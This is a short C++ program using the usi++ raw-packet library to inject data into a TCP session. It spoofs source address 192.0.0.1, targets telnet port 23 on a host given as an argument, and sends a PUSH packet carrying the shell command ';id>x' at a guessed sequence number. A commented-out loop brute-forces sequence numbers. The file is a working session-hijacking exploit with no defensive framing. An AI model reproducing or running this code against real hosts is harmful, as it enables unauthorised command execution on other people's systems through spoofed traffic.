#include <iostream>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <usi++/usi++.h>
#include <stddef.h>

int main(int argc, char **argv)
{
	char buf[100];
	
   	if (argc < 2) {
           	cout<<"Usage: "<<argv[0]<<" host\n";
                exit(1);
        }
	TCP tcp(argv[1]);

	tcp.init_device("eth0", 1, 100);
	tcp.setfilter("tcp and port 2620");

        tcp.set_flags(TH_PUSH);
        tcp.set_dstport(23);
	tcp.set_srcport(2624);
	tcp.set_src("192.0.0.1");

	int i;
/*	for (i = 1220000000U; i < 1800000000U; i += 1000) {
		printf("%d\r", i);
		tcp.set_seq(i);
		usleep(100);
		tcp.sendpack(";id>x\n");
	}
*/

	tcp.set_seq(567815162U);
	tcp.sendpack(";id>x\n");
			
        return 0;
}
